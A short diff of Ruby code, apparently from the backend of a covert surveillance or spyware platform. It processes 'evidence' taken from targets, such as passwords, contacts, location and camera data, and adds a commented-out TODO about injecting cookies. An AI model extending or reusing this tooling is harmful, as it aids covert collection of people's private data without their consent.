@@ -246,6 +246,10 @@ class InstanceWorker
       AggregatorQueue.add(@target._id, evidence._id, evidence.type)
     end
 
+    # TODO
+    # hash = DashboardWhitelist.inject_cookies_on(@agent, @target, @target.get_parent)
+    # ADD TO THE PUSH QUEUE
+
     # Do not check the intelligence license is enabled here. Some of the intelligence
     # features are provided WITHOUT the intelligence license.
     if ['addressbook', 'password', 'position', 'camera'].include?(evidence.type)
